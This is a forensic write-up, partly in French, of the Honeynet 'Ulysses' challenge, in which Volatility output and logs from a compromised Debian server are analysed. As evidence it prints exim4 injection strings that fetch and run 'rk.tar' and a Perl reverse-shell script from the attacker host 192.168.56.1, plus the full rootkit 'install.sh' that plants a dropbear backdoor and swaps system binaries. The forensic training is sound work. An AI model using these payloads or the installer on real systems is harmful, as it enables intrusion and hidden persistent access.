# Ulysses

## Info

- Category : Digital Forensics
- SHA1SUM :	b53238c60a72d6056dacff51ab041c9688553d07
- Published : Oct. 19, 2020
- Author :	The Honeynet Project
- Size : 429M
- Tags : Volatility Linux Memory Disk 

Scenario :

A Linux server was possibly compromised and a forensic analysis is required in order to understand what really happened. Hard disk dumps and memory snapshots of the machine are provided in order to solve the challenge.

Tools :

- Volatility
- 010 Editor
- Autopsy


## Question

```shell
vol.py --info | grep Linux
Volatility Foundation Volatility Framework 2.6.1

LinuxDebian5_26x86    - A Profile for Linux Debian5_26 x86
LinuxAMD64PagedMemory          - Linux-specific AMD 64-bit address space.
linux_aslr_shift            - Automatically detect the Linux ASLR shift
linux_banner                - Prints the Linux banner information
linux_yarascan              - A shell in the Linux memory image
linuxgetprofile             - Scan to try to determine the Linux profile
```

#### 1 - The attacker was performing a Brute Force attack. What account triggered the alert ?

On peut regarder avec volatility les services suceptible d'être brute-force.

```shell
vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pslist
Volatility Foundation Volatility Framework 2.6.1

Offset     Name                 Pid             PPid            Uid             Gid    DTB        Start Time
---------- -------------------- --------------- --------------- --------------- ------ ---------- ----------
0xcf42f900 init                 1               0               0               0      0x0f4b8000 2011-02-06 12:04:09 UTC+0000
0xcf42f4e0 kthreadd             2               0               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42f0c0 migration/0          3               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42eca0 ksoftirqd/0          4               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42e880 watchdog/0           5               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42e460 events/0             6               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42e040 khelper              7               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf4a1a40 kblockd/0            39              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf4a1200 kacpid               41              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf45d140 kacpi_notify         42              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf46c940 kseriod              86              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf43f100 pdflush              123             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf45d980 pdflush              124             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf45d560 kswapd0              125             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf43f520 aio/0                126             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf45c4e0 ksuspend_usbd        581             2               0               0      ---------- 2011-02-06 12:04:14 UTC+0000
0xcf48d1c0 khubd                582             2               0               0      ---------- 2011-02-06 12:04:14 UTC+0000
0xcf46d9c0 ata/0                594             2               0               0      ---------- 2011-02-06 12:04:15 UTC+0000
0xcf802a00 ata_aux              595             2               0               0      ---------- 2011-02-06 12:04:15 UTC+0000
0xcf43e080 scsi_eh_0            634             2               0               0      ---------- 2011-02-06 12:04:17 UTC+0000
0xcf45c0c0 kjournald            700             2               0               0      ---------- 2011-02-06 12:04:18 UTC+0000
0xcf46d5a0 udevd                776             1               0               0      0x0f5b2000 2011-02-06 12:04:21 UTC+0000
0xce978620 kpsmoused            1110            2               0               0      ---------- 2011-02-06 12:04:27 UTC+0000
0xce9796a0 portmap              1429            1               1               1      0x0eddf000 2011-02-06 12:04:35 UTC+0000
0xce973b00 rpc.statd            1441            1               102             0      0x0f8b3000 2011-02-06 12:04:35 UTC+0000
0xcf45c900 dhclient3            1624            1               0               0      0x0ec3d000 2011-02-06 12:04:39 UTC+0000
0xce972660 rsyslogd             1661            1               0               0      0x0e7ed000 2011-02-06 12:04:40 UTC+0000
0xcf43ece0 acpid                1672            1               0               0      0x0f8a8000 2011-02-06 12:04:40 UTC+0000
0xce979ac0 sshd                 1687            1               0               0      0x0fa65000 2011-02-06 12:04:41 UTC+0000
0xcf45cd20 exim4                1942            1               101             103    0x0e7bc000 2011-02-06 12:04:44 UTC+0000
0xcf803a80 cron                 1973            1               0               0      0x0f815000 2011-02-06 12:04:45 UTC+0000
0xcfaad720 login                1990            1               0               0      0x0eecf000 2011-02-06 12:04:45 UTC+0000
0xcf48c560 getty                1992            1               0               0      0x0ea31000 2011-02-06 12:04:45 UTC+0000
0xcf803240 getty                1994            1               0               0      0x0f671000 2011-02-06 12:04:45 UTC+0000
0xcf4a1620 getty                1996            1               0               0      0x0f838000 2011-02-06 12:04:45 UTC+0000
0xcf46cd60 getty                1998            1               0               0      0x0f83d000 2011-02-06 12:04:45 UTC+0000
0xcf4a0180 getty                2000            1               0               0      0x0e89e000 2011-02-06 12:04:45 UTC+0000
0xcf8021c0 bash                 2042            1990            0               0      0x0eecc000 2011-02-06 14:04:38 UTC+0000
0xcfaacee0 sh                   2065            1               0               0      0x0f517000 2011-02-06 14:07:15 UTC+0000
0xcfaac280 memdump              2168            2042            0               0      0x08088000 2011-02-06 14:42:27 UTC+0000
0xcf43e8c0 nc                   2169            2042            0               0      0x08084000 2011-02-06 14:42:27 UTC+0000
```

On remarque le processus **sshd**, on va donc pouvoir regarder les logs

```shell
tail /media/var/log/auth.log 
Feb  6 15:20:54 victoria sshd[2157]: Invalid user ulysses from 192.168.56.1
Feb  6 15:20:54 victoria sshd[2157]: Failed none for invalid user ulysses from 192.168.56.1 port 44616 ssh2
Feb  6 15:20:58 victoria sshd[2157]: pam_unix(sshd:auth): check pass; user unknown
Feb  6 15:20:58 victoria sshd[2157]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1 
Feb  6 15:21:00 victoria sshd[2157]: Failed password for invalid user ulysses from 192.168.56.1 port 44616 ssh2
Feb  6 15:21:03 victoria sshd[2157]: pam_unix(sshd:auth): check pass; user unknown
Feb  6 15:21:05 victoria sshd[2157]: Failed password for invalid user ulysses from 192.168.56.1 port 44616 ssh2
Feb  6 15:21:09 victoria sshd[2157]: pam_unix(sshd:auth): check pass; user unknown
Feb  6 15:21:10 victoria sshd[2157]: Failed password for invalid user ulysses from 192.168.56.1 port 44616 ssh2
Feb  6 15:21:10 victoria sshd[2157]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1 
```

On remarque plusieurs tentatives infructueuses pour le user **ulysses**

**Réponse : ulysses**

#### 2 - How many were failed attempts there ?

```shell
cat /media/var/log/auth.log  | grep "invalid user ulysses" | wc -l
32
```

**Réponse : 32**

#### 3 - What kind of system runs on the targeted server ?

```shell
cat /media/etc/issue
Debian GNU/Linux 5.0 \n \l
```

**Réponse : Debian GNU/Linux 5.0**

#### 4 - What is the victim's IP address ?

```shell
vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
Volatility Foundation Volatility Framework 2.6.1

UNIX 2190                 udevd/776   
UDP      0.0.0.0         :  111 0.0.0.0         :    0                           portmap/1429 
TCP      0.0.0.0         :  111 0.0.0.0         :    0 LISTEN                    portmap/1429 
UDP      0.0.0.0         :  769 0.0.0.0         :    0                         rpc.statd/1441 
UDP      0.0.0.0         :38921 0.0.0.0         :    0                         rpc.statd/1441 
TCP      0.0.0.0         :39296 0.0.0.0         :    0 LISTEN                  rpc.statd/1441 
UDP      0.0.0.0         :   68 0.0.0.0         :    0                         dhclient3/1624 
UNIX 5069             dhclient3/1624  
UNIX 4617              rsyslogd/1661  /dev/log
UNIX 4636                 acpid/1672  /var/run/acpid.socket
UNIX 4638                 acpid/1672  
TCP      ::              :   22 ::              :    0 LISTEN                       sshd/1687 
TCP      0.0.0.0         :   22 0.0.0.0         :    0 LISTEN                       sshd/1687 
TCP      ::              :   25 ::              :    0 LISTEN                      exim4/1942 
TCP      0.0.0.0         :   25 0.0.0.0         :    0 LISTEN                      exim4/1942 
UNIX 5132                 login/1990  
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
```

**Réponse : 192.168.56.102**

#### 5 - What are the attacker's two IP addresses ? Format: comma-separated in ascending order

```shell
vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
Volatility Foundation Volatility Framework 2.6.1

UNIX 2190                 udevd/776   
UDP      0.0.0.0         :  111 0.0.0.0         :    0                           portmap/1429 
[...]
UNIX 5132                 login/1990  
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
```

On a des connexion établies et fermées. On retrouve parmi ces connexion l'IP vu dans les logs SSH

**Réponse : 192.168.56.1,192.168.56.101**

#### 6 - What is the "nc" service PID number that was running on the server ?

```shell
vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
Volatility Foundation Volatility Framework 2.6.1

UNIX 2190                 udevd/776   
UDP      0.0.0.0         :  111 0.0.0.0         :    0                           portmap/1429 
[...]
UNIX 5132                 login/1990  
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
```

**Réponse : 2169**

#### 7 - What service was exploited to gain access to the system ? (one word)

```shell
vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pslist
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
Offset     Name                 Pid             PPid            Uid             Gid    DTB        Start Time
---------- -------------------- --------------- --------------- --------------- ------ ---------- ----------
0xcf42f900 init                 1               0               0               0      0x0f4b8000 2011-02-06 12:04:09 UTC+0000
0xcf42f4e0 kthreadd             2               0               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42f0c0 migration/0          3               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42eca0 ksoftirqd/0          4               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42e880 watchdog/0           5               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42e460 events/0             6               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf42e040 khelper              7               2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf4a1a40 kblockd/0            39              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf4a1200 kacpid               41              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf45d140 kacpi_notify         42              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf46c940 kseriod              86              2               0               0      ---------- 2011-02-06 12:04:09 UTC+0000
0xcf43f100 pdflush              123             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf45d980 pdflush              124             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf45d560 kswapd0              125             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf43f520 aio/0                126             2               0               0      ---------- 2011-02-06 12:04:10 UTC+0000
0xcf45c4e0 ksuspend_usbd        581             2               0               0      ---------- 2011-02-06 12:04:14 UTC+0000
0xcf48d1c0 khubd                582             2               0               0      ---------- 2011-02-06 12:04:14 UTC+0000
0xcf46d9c0 ata/0                594             2               0               0      ---------- 2011-02-06 12:04:15 UTC+0000
0xcf802a00 ata_aux              595             2               0               0      ---------- 2011-02-06 12:04:15 UTC+0000
0xcf43e080 scsi_eh_0            634             2               0               0      ---------- 2011-02-06 12:04:17 UTC+0000
0xcf45c0c0 kjournald            700             2               0               0      ---------- 2011-02-06 12:04:18 UTC+0000
0xcf46d5a0 udevd                776             1               0               0      0x0f5b2000 2011-02-06 12:04:21 UTC+0000
0xce978620 kpsmoused            1110            2               0               0      ---------- 2011-02-06 12:04:27 UTC+0000
0xce9796a0 portmap              1429            1               1               1      0x0eddf000 2011-02-06 12:04:35 UTC+0000
0xce973b00 rpc.statd            1441            1               102             0      0x0f8b3000 2011-02-06 12:04:35 UTC+0000
0xcf45c900 dhclient3            1624            1               0               0      0x0ec3d000 2011-02-06 12:04:39 UTC+0000
0xce972660 rsyslogd             1661            1               0               0      0x0e7ed000 2011-02-06 12:04:40 UTC+0000
0xcf43ece0 acpid                1672            1               0               0      0x0f8a8000 2011-02-06 12:04:40 UTC+0000
0xce979ac0 sshd                 1687            1               0               0      0x0fa65000 2011-02-06 12:04:41 UTC+0000
0xcf45cd20 exim4                1942            1               101             103    0x0e7bc000 2011-02-06 12:04:44 UTC+0000
0xcf803a80 cron                 1973            1               0               0      0x0f815000 2011-02-06 12:04:45 UTC+0000
0xcfaad720 login                1990            1               0               0      0x0eecf000 2011-02-06 12:04:45 UTC+0000
0xcf48c560 getty                1992            1               0               0      0x0ea31000 2011-02-06 12:04:45 UTC+0000
0xcf803240 getty                1994            1               0               0      0x0f671000 2011-02-06 12:04:45 UTC+0000
0xcf4a1620 getty                1996            1               0               0      0x0f838000 2011-02-06 12:04:45 UTC+0000
0xcf46cd60 getty                1998            1               0               0      0x0f83d000 2011-02-06 12:04:45 UTC+0000
0xcf4a0180 getty                2000            1               0               0      0x0e89e000 2011-02-06 12:04:45 UTC+0000
0xcf8021c0 bash                 2042            1990            0               0      0x0eecc000 2011-02-06 14:04:38 UTC+0000
0xcfaacee0 sh                   2065            1               0               0      0x0f517000 2011-02-06 14:07:15 UTC+0000
0xcfaac280 memdump              2168            2042            0               0      0x08088000 2011-02-06 14:42:27 UTC+0000
0xcf43e8c0 nc                   2169            2042            0               0      0x08084000 2011-02-06 14:42:27 UTC+0000
```

On repère le processus **exim4** :

```
cat /media/var/log/exim4/rejectlog

Envelope-to: <postmaster@localhost>
  Header0000: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
  Header0001: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
  [...]
  Header0054: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
  Header0055: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
  HeaderX: ${run{/bin/sh -c "exec /bin/sh -c 'rm /tmp/rk.tar; sleep 1000'"}} 
  [...]
  ${run{/bin/sh -c "exec /bin/sh -c 'rm /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c
```

On remarque des attaques via **buffer overflow**

**Réponse : exim4**

#### 8 - What is the CVE number of exploited vulnerability ?

On va chercher sur **exploit-db** une une exploitation lié à une CVE.

**Réponse : CVE-2010-4344**

#### 9 - During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.

```shell
cat /media/var/log/exim4/mainlog | grep wget

2011-02-06 15:20:20 H=(h0n3yn3t-pr0j3ct.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string " -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}}
```

**Réponse : rk.tar**

#### 10 - Two ports were involved in the process of data exfiltration. Provide the port number of the highest one.

```shell
vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
Volatility Foundation Volatility Framework 2.6.1

UNIX 2190                 udevd/776   
UDP      0.0.0.0         :  111 0.0.0.0         :    0                           portmap/1429 
[...]
UNIX 5132                 login/1990  
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :43327 192.168.56.1    : 4444 ESTABLISHED                    sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                          sh/2065 
TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
```

**Réponse : 8888**

#### 11 - Which port did the attacker try to block on the firewall ?

```shell
cat /media/var/log/exim4/mainlog | grep wget

${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'"}}
[...]
2011-02-06 15:20:20 H=(h0n3yn3t-pr0j3ct.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string " -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} 
```

On a les fichier télécharger dans `/tmp`

```shell
sudo tar -xvf /media/tmp/rk.tar
rk/
rk/procps/
rk/procps/watch
rk/procps/w
rk/procps/vmstat
rk/procps/skill
rk/procps/snice
rk/procps/top
rk/procps/tload
rk/procps/slabtop
rk/procps/ps
rk/procps/sysctl
rk/procps/uptime
rk/procps/pwdx
rk/procps/kill
rk/procps/free
rk/procps/pgrep
rk/procps/pkill
rk/procps/pmap
rk/mig
rk/dropbear
rk/vars.sh
rk/install.sh
 
remnux@remnux:~/Documents/Ulysses$ cat rk/install.sh 
#!/bin/bash
IFS='
'
umask 0022
if [ ! -f vars.sh ]
then
    echo "Can't find vars.sh, exiting"
    exit
fi
source vars.sh
mkdir -p $rk_home_dir
cp dropbear $rk_home_dir
chmod +x $rk_home_dir/dropbear
chattr +ia $rk_home_dir/dropbear
cp busybox $rk_home_dir
chmod +x $rk_home_dir/busybox
chattr +ia $rk_home_dir/busybox
cp mig $rk_home_dir
chattr +ia $rk_home_dir/mig


if [ -x /etc/init.d/boot.local ]
then
    echo "autostart in /etc/init.d/boot.local"
    echo "$rk_home_dir/dropbear " >> /etc/init.d/boot.local
    echo "/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP" >> /etc/init.d/boot.local
fi


if [ -x /etc/rc.d/rc.local ]
then
    echo "autostart in /etc/rc.d/rc.local"
    echo  "$rk_home_dir/dropbear">> /etc/rc.d/rc.local
    echo "/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP" >> /etc/rc.d/rc.local
fi

dtest=`which update-rc.d`
if [ ! -z $dtest ]
then
    echo "debian like system"
    echo "$rk_home_dir/dropbear " >> /etc/init.d/xfs3
    echo "/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP" >> /etc/init.d/xfs3
    chmod +x /etc/init.d/xfs3
    update-rc.d xfs3 defaults
fi

$rk_home_dir/dropbear

#################################### procps
for l in `ls procps`
do
    o=`which $l`
    if [ ! -z $o ]
    then
	chattr -ia $o
	rm -f $o
	cp procps/$l $o
	chattr +ia $o
    fi
done
mkdir -p /usr/include/mysql
echo dropbear >> /usr/include/mysql/mysql.hh1
if [ -f /sbin/ttymon ]
then
    echo "WARNING: SHV5/SHV4 RK DETECTED"
    chattr -ia /sbin/ttymon /sbin/ttyload
    rm -f /sbin/ttymon /sbin/ttyload
    kill -9 `pidof ttymon`
    kill -9 `pidof ttyload`
fi
iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP
echo 
echo 
echo 
echo "Don't forget to:"
echo "cd .."
echo "rm -rf rk rk.tbz2"
```

On voit que l'attaquant essaye de faire drop toutes les connexions destinées au port 45295

**Réponse : 45295**
